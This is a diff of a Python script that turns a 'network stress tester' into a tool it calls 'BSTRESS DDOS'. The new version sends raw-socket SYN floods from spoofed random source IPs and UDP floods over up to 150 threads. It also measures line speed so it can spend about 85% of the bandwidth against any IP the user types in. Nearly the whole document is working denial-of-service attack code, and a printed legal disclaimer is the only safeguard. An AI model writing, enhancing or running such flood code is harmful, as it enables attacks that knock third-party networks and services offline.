@@ -1,233 +1,277 @@
 import threading
 import socket
-import requests
 import time
-import psutil
 import random
 from collections import defaultdict
-import argparse
+import psutil
+import speedtest
 
-class NetworkMonitor:
+class NetworkOptimizer:
     def __init__(self):
-        self.last_update = time.time()
-        self.last_sent = 0
-        self.last_recv = 0
-        self.current_sent = 0
-        self.current_recv = 0
-        self.max_bandwidth = self._get_max_bandwidth()
-        
-    def _get_max_bandwidth(self):
-        """Get maximum bandwidth in bytes/second"""
-        try:
-            # Get speed of primary interface (convert Mbps to bytes/s)
-            stats = psutil.net_if_stats()
-            if stats:
-                return stats[list(stats.keys())[0]].speed * 125000  # 1 Mbps = 125,000 bytes/s
-        except:
-            pass
-        return 0  # Fallback if can't detect
-    
-    def update(self):
-        """Update current network usage"""
-        now = time.time()
-        elapsed = now - self.last_update
-        if elapsed < 0.2:  # Don't update too frequently
-            return
-            
-        net_io = psutil.net_io_counters()
-        self.current_sent = (net_io.bytes_sent - self.last_sent) / elapsed
-        self.current_recv = (net_io.bytes_recv - self.last_recv) / elapsed
-        
-        self.last_sent = net_io.bytes_sent
-        self.last_recv = net_io.bytes_recv
-        self.last_update = now
-        
-    def get_usage(self):
-        """Get current bandwidth usage as percentage"""
-        if self.max_bandwidth <= 0:
-            return 0, 0  # Couldn't determine max bandwidth
-            
-        sent_pct = min(100, (self.current_sent / self.max_bandwidth) * 100)
-        recv_pct = min(100, (self.current_recv / self.max_bandwidth) * 100)
-        return sent_pct, recv_pct
-
-class RouterStressTester:
-    def __init__(self, target_ip, threads_per_attack=10):
-        self.target_ip = target_ip
-        self.threads_per_attack = threads_per_attack
+        self.max_bandwidth = 0  # in bytes/second
+        self.measured = False
         self.lock = threading.Lock()
-        self.stop_flag = False
-        self.net_monitor = NetworkMonitor()
-        self.stats = defaultdict(int)
-        self.stats.update({
-            'start_time': time.time(),
-            'syn_raw': 0,
-            'throttled': 0
-        })
-        self.start_net_stats = psutil.net_io_counters()
-
-    def _check_throttle(self):
-        """Check and handle network throttling"""
-        self.net_monitor.update()
-        sent_pct, recv_pct = self.net_monitor.get_usage()
+        self.last_bytes = psutil.net_io_counters().bytes_sent
+        self.last_time = time.time()
         
-        # Throttle if either upload or download exceeds 90%
-        if sent_pct > 90 or recv_pct > 90:
-            with self.lock:
-                self.stats['throttled'] += 1
-            time.sleep(0.05)
-            return True
-        return False
-
-    def http_flood(self):
-        """HTTP flood attack"""
-        session = requests.Session()
-        url = f"http://{self.target_ip}"
-        while not self.stop_flag:
-            if self._check_throttle():
-                continue
-            try:
-                session.get(url, timeout=2)
-                with self.lock:
-                    self.stats['http'] += 1
-            except:
-                with self.lock:
-                    self.stats['errors'] += 1
-
-    def syn_flood(self, port=80):
-        """Standard SYN flood using TCP sockets"""
-        while not self.stop_flag:
-            if self._check_throttle():
-                continue
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(1)
-                    s.connect((self.target_ip, port))
-                    with self.lock:
-                        self.stats['syn'] += 1
-            except:
-                with self.lock:
-                    self.stats['errors'] += 1
-
-    def syn_flood_raw(self, port=80):
-        """Advanced SYN flood using raw sockets (requires root)"""
+    def measure_bandwidth(self):
+        """Measure maximum download/upload speed using speedtest"""
+        print("\n[+] Measuring your network speed (like speedtest.net)...")
+        
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            st = speedtest.Speedtest()
+            st.get_best_server()
+            
+            print("  Testing download speed...")
+            download_speed = st.download()  # in bits/second
+            print("  Testing upload speed...")
+            upload_speed = st.upload()  # in bits/second
+            
+            # Use the lower of download/upload to be conservative
+            measured_speed = min(download_speed, upload_speed)
+            self.max_bandwidth = (measured_speed * 0.85) / 8  # 85% of max in bytes/second
+            self.measured = True
+            
+            print(f"\n[+] Network measurement complete:")
+            print(f"    Download: {download_speed/1e6:.2f} Mbps")
+            print(f"    Upload: {upload_speed/1e6:.2f} Mbps")
+            print(f"    Attack will use up to: {self.max_bandwidth*8/1e6:.2f} Mbps (85% of limit)")
+            
+        except Exception as e:
+            print(f"[!] Speedtest failed: {str(e)}")
+            print("    Falling back to interface speed detection")
+            self._fallback_bandwidth_measurement()
+    
+    def _fallback_bandwidth_measurement(self):
+        """Fallback method if speedtest fails"""
+        try:
+            stats = psutil.net_if_stats()
+            max_speed = 0
+            for interface in stats.values():
+                if interface.speed > max_speed:
+                    max_speed = interface.speed
+            if max_speed > 0:
+                self.max_bandwidth = (max_speed * 125000) * 0.85  # 85% of interface speed
+                print(f"    Using interface speed: {max_speed} Mbps")
+            else:
+                self.max_bandwidth = float('inf')
+                print("    Cannot determine max speed - no throttling")
+        except:
+            self.max_bandwidth = float('inf')
+            print("    Cannot measure speed - no throttling")
+        self.measured = True
+    
+    def check_capacity(self, packet_size, burst_size=10):
+        """Optimized capacity check with burst allowance"""
+        if not self.measured or self.max_bandwidth == float('inf'):
+            return False
+            
+        with self.lock:
+            now = time.time()
+            current_bytes = psutil.net_io_counters().bytes_sent
+            elapsed = max(0.001, now - self.last_time)
+            
+            current_rate = (current_bytes - self.last_bytes) / elapsed
+            
+            # Allow 10% burst above target bandwidth
+            if current_rate + (packet_size * burst_size) > self.max_bandwidth * 1.1:
+                sleep_time = (packet_size * burst_size) / self.max_bandwidth
+                time.sleep(min(sleep_time, 0.01))  # Reduced sleep time
+                return True
+                
+            self.last_bytes = current_bytes
+            self.last_time = now
+            return False
+
+class HighPerformanceAttacker:
+    def __init__(self, target_ip, threads=100):  # Default to max threads
+        self.target_ip = target_ip
+        self.threads = min(150, max(10, threads))  # Increased max to 150
+        self.stop_flag = False
+        self.optimizer = NetworkOptimizer()
+        self.stats = defaultdict(int)
+        self.stats['start_time'] = time.time()
+        
+        # Pre-built packets (larger pool)
+        self.syn_packets = [self._create_syn_packet() for _ in range(500)]  # Increased from 100
+        self.udp_payloads = [self._create_udp_payload() for _ in range(20)]  # Increased from 10
+
+    def _create_syn_packet(self):
+        """Optimized SYN packet creation"""
+        ip_header = (
+            b'\x45\x00\x00\x28'  # IP version, IHL, total length
+            + random.randint(0, 65535).to_bytes(2, 'big')  # Identification
+            + b'\x40\x00\x40\x06'  # Flags, Fragment, TTL, Protocol
+            + b'\x00\x00'  # Header checksum
+            + socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
+            + socket.inet_aton(self.target_ip)
+        )
+        
+        tcp_header = (
+            random.randint(1024, 65535).to_bytes(2, 'big')  # Source port
+            + random.choice([80, 443]).to_bytes(2, 'big')  # Common ports
+            + random.randint(0, 4294967295).to_bytes(4, 'big')  # Sequence
+            + b'\x00\x00\x00\x00'  # ACK number
+            + b'\x50\x02\xff\xff'  # Header length, SYN flag, window
+            + b'\x00\x00'  # Checksum
+            + b'\x00\x00'  # Urgent pointer
+        )
+        
+        return ip_header + tcp_header
+
+    def _create_udp_payload(self):
+        """Optimized UDP payload (fixed 1470 bytes for MTU)"""
+        return bytes([random.randint(0, 255) for _ in range(1470)])
+
+    def syn_flood(self):
+        """Ultra-high-performance SYN flood with burst sending"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             
-            def craft_syn_packet():
-                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-                ip_header = b'\x45\x00\x00\x3c'  # IP header
-                ip_header += b'\x00\x00\x40\x00\x40\x06\x00\x00'  # More IP header
-                ip_header += socket.inet_aton(src_ip)  # Source IP (randomized)
-                ip_header += socket.inet_aton(self.target_ip)  # Destination IP
-                
-                tcp_header = b'\x00\x50'  # Source port (random)
-                tcp_header += port.to_bytes(2, 'big')  # Destination port
-                tcp_header += b'\x00\x00\x00\x00'  # Sequence number
-                tcp_header += b'\x00\x00\x00\x00'  # Acknowledgement number
-                tcp_header += b'\x50\x02\xff\xff'  # Header length + SYN flag
-                tcp_header += b'\x00\x00\x00\x00'  # Window size
-                
-                return ip_header + tcp_header
-            
             while not self.stop_flag:
-                if self._check_throttle():
-                    continue
-                try:
-                    s.sendto(craft_syn_packet(), (self.target_ip, 0))
-                    with self.lock:
-                        self.stats['syn_raw'] += 1
-                except:
-                    with self.lock:
+                # Send burst of 20 packets before checking capacity
+                for _ in range(20):
+                    packet = random.choice(self.syn_packets)
+                    try:
+                        s.sendto(packet, (self.target_ip, 0))
+                        with self.optimizer.lock:
+                            self.stats['syn'] += 1
+                            self.stats['total'] += 1
+                    except:
                         self.stats['errors'] += 1
-                        
+                
+                # Check capacity after burst
+                if self.optimizer.check_capacity(60, burst_size=20):  # ~60 bytes per SYN
+                    continue
         except PermissionError:
-            print("[!] Raw SYN flood requires root/admin privileges. Falling back to TCP SYN.")
-            self.syn_flood(port)
+            print("[!] Raw sockets require root privileges!")
+            exit(1)
 
     def udp_flood(self, port=53):
-        """Maximized UDP payload flood"""
-        payload = b'X' * 65507  # Maximum UDP payload
+        """Optimized UDP flood with burst sending"""
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
         while not self.stop_flag:
-            if self._check_throttle():
-                continue
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            # Send burst of 10 packets
+            for _ in range(10):
+                payload = random.choice(self.udp_payloads)
+                try:
                     s.sendto(payload, (self.target_ip, port))
-                    with self.lock:
+                    with self.optimizer.lock:
                         self.stats['udp'] += 1
-            except:
-                with self.lock:
+                        self.stats['total'] += 1
+                except:
                     self.stats['errors'] += 1
+            
+            # Check capacity after burst
+            if self.optimizer.check_capacity(1470, burst_size=10):
+                continue
 
     def display_stats(self):
-        """Improved real-time monitoring with proper network stats"""
-        while not self.stop_flag:
-            time.sleep(1)
-            with self.lock:
-                self.net_monitor.update()
-                sent_pct, recv_pct = self.net_monitor.get_usage()
-                elapsed = time.time() - self.stats['start_time']
-                current_net = psutil.net_io_counters()
-                
-                print("\033[H\033[J")  # Clear console
-                print("=== BSTRESS Network Stress Tester ===")
-                print(f"Target: {self.target_ip} | Runtime: {int(elapsed)}s")
-                print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
-                print(f"Errors: {self.stats['errors']} | Throttle Events: {self.stats['throttled']}")
-                
-                # Improved network display
-                total_sent = (current_net.bytes_sent - self.start_net_stats.bytes_sent)/1024/1024
-                total_recv = (current_net.bytes_recv - self.start_net_stats.bytes_recv)/1024/1024
-                print(f"\nNetwork Usage:")
-                print(f"  Current: ↑{sent_pct:.1f}% ↓{recv_pct:.1f}%")
-                print(f"  Total: ↑{total_sent:.2f}MB ↓{total_recv:.2f}MB")
-                print(f"\nPress CTRL+C to stop...")
-
-    def run_test(self):
-        """Start all attack threads"""
-        attacks = [
-            self.http_flood,
-            self.syn_flood,
-            self.syn_flood_raw,
-            self.udp_flood
-        ]
-        threads = []
+        """Optimized stats display with reduced overhead"""
+        start_time = self.stats['start_time']
+        start_bytes = psutil.net_io_counters().bytes_sent
+        last_display = 0
         
-        for attack in attacks:
-            for _ in range(self.threads_per_attack):
-                t = threading.Thread(target=attack)
-                t.daemon = True
-                t.start()
-                threads.append(t)
+        while not self.stop_flag:
+            now = time.time()
+            if now - last_display < 1.0:
+                time.sleep(0.1)
+                continue
+                
+            elapsed = now - start_time
+            current_bytes = psutil.net_io_counters().bytes_sent
+            last_display = now
+            
+            # Calculate rates
+            mb_sent = (current_bytes - start_bytes) / 1024 / 1024
+            mbps = (mb_sent * 8) / elapsed if elapsed > 0 else 0
+            max_mbps = self.optimizer.max_bandwidth*8/1e6 if self.optimizer.measured else 0
+            usage_pct = (mbps/max_mbps*100) if max_mbps > 0 else 0
+            
+            # Only print if terminal is available
+            print("\033[H\033[J", end='')
+            print("=== BSTRESS DDOS ===")
+            print(f"Target: {self.target_ip} | Threads: {self.threads}")
+            print(f"Runtime: {int(elapsed)}s | PPS: {self.stats['total']/elapsed:,.0f}")
+            print(f"SYN: {self.stats['syn']:,} | UDP: {self.stats['udp']:,}")
+            print(f"Errors: {self.stats['errors']:,}")
+            print(f"\nBandwidth: {mbps:.2f} Mbps of {max_mbps:.2f} Mbps ({min(100, usage_pct):.1f}%)")
+            print("Press CTRL+C to stop")
 
+    def run(self):
+        """Optimized attack execution"""
+        self.optimizer.measure_bandwidth()
+        time.sleep(1)
+        
+        print(f"\n[+] Starting optimized attack on {self.target_ip}")
+        print(f"    Threads: {self.threads} (SYN: {self.threads//2}, UDP: {self.threads//2})")
+        
+        # Start attack threads
+        for _ in range(self.threads // 2):
+            threading.Thread(target=self.syn_flood, daemon=True).start()
+            threading.Thread(target=self.udp_flood, daemon=True).start()
+        
+        # Start stats display
         threading.Thread(target=self.display_stats, daemon=True).start()
-
+        
         try:
-            while True: time.sleep(0.1)
+            while True: 
+                time.sleep(0.1)
         except KeyboardInterrupt:
             self.stop_flag = True
             print("\n[!] Stopping attack...")
             time.sleep(1)
-            self._show_final_stats()
+            
+            elapsed = time.time() - self.stats['start_time']
+            print(f"\n=== FINAL STATS ===")
+            print(f"Duration: {elapsed:.1f} seconds")
+            print(f"Total packets: {self.stats['total']:,}")
+            print(f"Average PPS: {self.stats['total']/elapsed:,.0f}")
+            print(f"Bandwidth used: {(self.stats['total']*60/elapsed)/1e6:.2f} Mbps")  # Approx
 
-    def _show_final_stats(self):
-        elapsed = time.time() - self.stats['start_time']
-        total = sum(self.stats[k] for k in ['http','syn','syn_raw','udp'])
-        print("\n=== FINAL REPORT ===")
-        print(f"Runtime: {elapsed:.1f}s | Packets: {total}")
-        print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
-        print(f"Error Rate: {self.stats['errors']/total*100:.1f}%")
-        print(f"Throttle Events: {self.stats['throttled']}")
+def get_target_ip():
+    """Get and validate target IP"""
+    print("\n[!] LEGAL USE ONLY. UNAUTHORIZED TESTING IS ILLEGAL.")
+    print("=== BSTRESS DDOS ===\n")
+    
+    while True:
+        target = input("Enter target IP address: ").strip()
+        try:
+            socket.inet_aton(target)
+            return target
+        except socket.error:
+            print("Invalid IP format. Example: 192.168.1.1")
+
+def get_thread_count():
+    """Get validated thread count"""
+    while True:
+        try:
+            threads = int(input("Threads (10-150, default 100): ") or 100)
+            if 10 <= threads <= 150:
+                return threads
+            print("Please enter 10-150")
+        except ValueError:
+            print("Numbers only")
+
+def main():
+    target_ip = get_target_ip()
+    threads = get_thread_count()
+    
+    confirm = input(f"\nConfirm attack on {target_ip} with {threads} threads? (y/n): ")
+    if confirm.lower() == 'y':
+        attacker = HighPerformanceAttacker(target_ip, threads)
+        attacker.run()
+    else:
+        print("[!] Cancelled")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="BSTRESS Network Load Tester")
-    parser.add_argument("target", help="Target IP address")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads per attack type")
-    args = parser.parse_args()
-
-    print("\n[!] LEGAL WARNING: For authorized testing only!")
-    confirm = input(f"Stress test {args.target} with {args.threads} threads? (y/n): ")
-    if confirm.lower() == 'y':
-        RouterStressTester(args.target, args.threads).run_test()
+    try:
+        import speedtest
+    except ImportError:
+        print("[!] Please install speedtest-cli: pip install speedtest-cli")
+        exit(1)
+        
+    main()
